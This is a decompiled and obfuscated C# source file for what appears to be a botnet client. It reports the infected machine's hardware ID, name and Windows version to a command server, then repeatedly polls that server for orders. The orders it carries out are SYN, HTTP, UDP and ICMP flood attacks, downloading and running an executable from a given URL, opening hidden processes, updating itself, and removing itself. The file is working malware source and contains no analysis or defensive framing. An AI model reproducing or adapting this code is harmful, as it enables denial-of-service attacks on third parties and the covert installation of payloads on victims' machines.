using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using ns1;

namespace ns0;

internal class Class0
{
	private string string_0 = string.Empty;

	public void method_0()
	{
		method_1();
		Thread thread = new Thread(method_2);
		thread.Start();
	}

	private void method_1()
	{
		string string_ = "mode=0&hwid=" + Class10.class2_0.string_6 + "&botver=" + Class10.class2_0.string_3 + "&pcname=" + Class10.class2_0.string_7 + "&winver=" + Class10.class2_0.string_8;
		while (true)
		{
			try
			{
				string text = method_3(Class10.class2_0.string_2, string_);
				if (text.Length > 0)
				{
					if (text == Class10.class2_0.string_5)
					{
						break;
					}
					Environment.Exit(-1);
				}
			}
			catch
			{
			}
			Thread.Sleep(Class10.class2_0.int_0 * 60 * 1000);
		}
	}

	private void method_2()
	{
		string string_ = "mode=1&hwid=" + Class10.class2_0.string_6;
		while (true)
		{
			try
			{
				string text = method_3(Class10.class2_0.string_2, string_);
				if (text.Length > 0)
				{
					if (text != string_0)
					{
						method_4(text);
						string_0 = text;
					}
				}
				else
				{
					try
					{
						Class12.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class8.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class6.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class4.smethod_1();
					}
					catch
					{
					}
					string_0 = string.Empty;
				}
			}
			catch
			{
			}
			Thread.Sleep(Class10.class2_0.int_0 * 60 * 1000);
		}
	}

	private string method_3(string string_1, string string_2)
	{
		ServicePointManager.Expect100Continue = false;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_1);
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		httpWebRequest.Method = "POST";
		httpWebRequest.UserAgent = Class10.class2_0.string_5;
		byte[] bytes = Encoding.ASCII.GetBytes(string_2);
		httpWebRequest.ContentLength = bytes.Length;
		Stream requestStream = httpWebRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		WebResponse response = httpWebRequest.GetResponse();
		if (response == null)
		{
			return string.Empty;
		}
		StreamReader streamReader = new StreamReader(response.GetResponseStream());
		return streamReader.ReadToEnd().Trim();
	}

	private void method_4(string string_1)
	{
		string[] array = new string[0];
		try
		{
			array = string_1.Split(new char[1] { '*' });
		}
		catch
		{
		}
		string key;
		if ((key = array[0]) == null)
		{
			return;
		}
		if (Class16.dictionary_0 == null)
		{
			Class16.dictionary_0 = new Dictionary<string, int>(8)
			{
				{ "synflood", 0 },
				{ "httpflood", 1 },
				{ "udpflood", 2 },
				{ "icmpflood", 3 },
				{ "download", 4 },
				{ "visit", 5 },
				{ "update", 6 },
				{ "remove", 7 }
			};
		}
		if (!Class16.dictionary_0.TryGetValue(key, out var value))
		{
			return;
		}
		switch (value)
		{
		case 0:
			try
			{
				Class12.string_0 = Convert.ToString(array[1]);
				Class12.ushort_0 = ushort.Parse(array[2]);
				Class12.int_1 = Convert.ToInt32(array[3]);
				Class12.int_0 = Convert.ToInt32(array[4]);
				Class12.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case 1:
			try
			{
				Class8.string_0 = Convert.ToString(array[1]);
				Class8.int_0 = Convert.ToInt32(array[2]);
				Class8.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case 2:
			try
			{
				Class6.string_0 = Convert.ToString(array[1]);
				Class6.ushort_0 = ushort.Parse(array[2]);
				Class6.int_1 = Convert.ToInt32(array[3]);
				Class6.int_2 = Convert.ToInt32(array[4]);
				Class6.int_0 = Convert.ToInt32(array[5]);
				Class6.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case 3:
			try
			{
				Class4.string_0 = Convert.ToString(array[1]);
				Class4.ushort_0 = ushort.Parse(array[2]);
				Class4.int_2 = Convert.ToInt32(array[3]);
				Class4.int_0 = Convert.ToInt32(array[4]);
				Class4.int_1 = Convert.ToInt32(array[5]);
				Class4.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case 4:
			try
			{
				string text = Class10.class11_0.method_3(new Random().Next(5, 12)) + ".exe";
				new WebClient().DownloadFile(Convert.ToString(array[1]), Environment.GetEnvironmentVariable("TEMP") + "\\" + text);
				Process process = new Process();
				process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
				process.Start();
				break;
			}
			catch
			{
				break;
			}
		case 5:
			try
			{
				Process process = new Process();
				process.StartInfo = new ProcessStartInfo(Convert.ToString(array[1]));
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				break;
			}
			catch
			{
				break;
			}
		case 6:
			Class10.class3_0.method_3(Convert.ToString(array[1]));
			break;
		case 7:
			if (array[1] == Environment.MachineName || array[1].ToUpper() == "ALL")
			{
				Class10.class3_0.method_4();
			}
			break;
		}
	}
}
